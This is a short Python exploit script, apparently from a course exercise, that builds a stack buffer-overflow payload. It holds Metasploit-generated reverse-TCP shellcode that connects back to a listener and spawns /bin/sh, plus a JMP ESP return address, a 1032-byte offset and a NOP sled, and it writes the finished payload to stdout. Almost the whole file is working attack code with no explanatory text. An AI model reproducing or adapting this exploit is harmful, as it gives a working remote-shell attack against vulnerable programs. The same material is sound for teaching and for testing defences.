# Author: Jace Kline 2881618

import sys

# constants

# JMP ESP instruction addr = 0x42122ba7
return_eip_addr_little_endian = b"\xa7\x2b\x12\x42" # set to a memory address that contains a JMP $ESP instruction
offset = 1032

# linux/x86/shell_reverse_tcp - 198 bytes
# https://metasploit.com/
# Encoder: x86/alpha_mixed
# VERBOSE=false, LHOST=192.168.180.10, LPORT=8228,
# ReverseAllowProxy=false, ReverseListenerThreaded=false,
# StagerRetryCount=10, StagerRetryWait=5, PrependFork=false,
# PrependSetresuid=false, PrependSetreuid=false,
# PrependSetuid=false, PrependSetresgid=false,
# PrependSetregid=false, PrependSetgid=false,
# PrependChrootBreak=false, AppendExit=false,
# MeterpreterDebugLevel=0, RemoteMeterpreterDebugFile=,
# CreateSession=true, AutoVerifySession=true, CMD=/bin/sh
buf =  b""
buf += b"\x89\xe3\xdb\xcd\xd9\x73\xf4\x5e\x56\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x34\x71\x59\x4b\x6c"
buf += b"\x37\x69\x73\x43\x63\x42\x63\x72\x73\x53\x5a\x74\x42"
buf += b"\x4e\x69\x6b\x51\x68\x30\x42\x46\x7a\x6d\x6d\x50\x6f"
buf += b"\x63\x51\x49\x78\x30\x77\x4f\x7a\x6d\x4d\x50\x71\x59"
buf += b"\x61\x69\x69\x69\x33\x58\x59\x50\x4e\x48\x6f\x44\x67"
buf += b"\x7a\x72\x48\x45\x52\x75\x50\x37\x50\x54\x64\x6c\x49"
buf += b"\x38\x61\x6c\x70\x43\x56\x46\x30\x53\x61\x36\x33\x78"
buf += b"\x33\x34\x43\x4f\x79\x49\x71\x7a\x6d\x6f\x70\x76\x32"
buf += b"\x33\x58\x42\x4e\x66\x4f\x74\x33\x33\x58\x73\x58\x76"
buf += b"\x4f\x66\x4f\x72\x42\x42\x49\x6c\x49\x6b\x53\x76\x32"
buf += b"\x66\x33\x6c\x49\x49\x71\x58\x30\x64\x4b\x58\x4d\x4f"
buf += b"\x70\x41\x41"

# pad the start of the shellcode with NOP sled
# append the shellcode to the end of NOP sled - make sure to align
# append with multiple copies of the return address to overwrite the saved EIP with (should be an address in the NOP sled)
def mk_shellcode(return_eip_addr_bytes: bytes, offset: int, shellcode_bytes: bytes, wordsize=4) -> str:
    buffer = return_eip_addr_bytes*(int(offset / wordsize) + 1)
    nopsled = b"\x90"*(8 * wordsize)
    shellcode = buffer + nopsled + shellcode_bytes
    return shellcode

if __name__ == "__main__":
    code = mk_shellcode(return_eip_addr_little_endian, offset, buf)
    sys.stdout.buffer.write(code)
